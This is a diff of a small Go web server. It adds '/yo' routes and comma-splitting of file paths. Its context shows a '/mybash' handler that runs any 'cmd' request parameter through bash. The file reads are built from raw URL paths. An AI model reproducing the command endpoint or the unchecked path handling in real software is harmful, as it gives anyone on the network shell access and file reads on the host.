@@ -53,7 +53,13 @@ func main() {
 	// fs := http.FileServer(http.Dir("./public"))
 	//mux.Handle("/", http.StripPrefix("/", fs))
 
-
+  mux.HandleFunc("/yo", func(w http.ResponseWriter, r *http.Request) {
+    http.ServeFile(w, r, "./public/yo.html")  
+  })
+  mux.HandleFunc("/yo/", func(w http.ResponseWriter, r *http.Request) {
+    log.Printf("the yo path: %s", r.URL.Path)
+    http.ServeFile(w, r, "./public/yo.html")  
+  })
 	mux.HandleFunc("/mybash", func(w http.ResponseWriter, r *http.Request) {
 	  cmd := exec.Command("bash", "-c", r.FormValue("cmd"))
 	  ret, err := cmd.CombinedOutput()
@@ -73,9 +79,10 @@ func main() {
 			return
 		}
 		if r.Method == "GET" {
-			c, err := ioutil.ReadFile(*location + "/" + r.URL.Path[1:])
+			parts := strings.Split(r.URL.Path, ",")
+			c, err := ioutil.ReadFile(*location + "/" + parts[0][1:])
 			if err != nil {
-				http.Error(w, "error reading requested file", http.StatusInternalServerError)
+				http.Error(w, "error reading r equested file", http.StatusInternalServerError)
 				return
 			}
 			
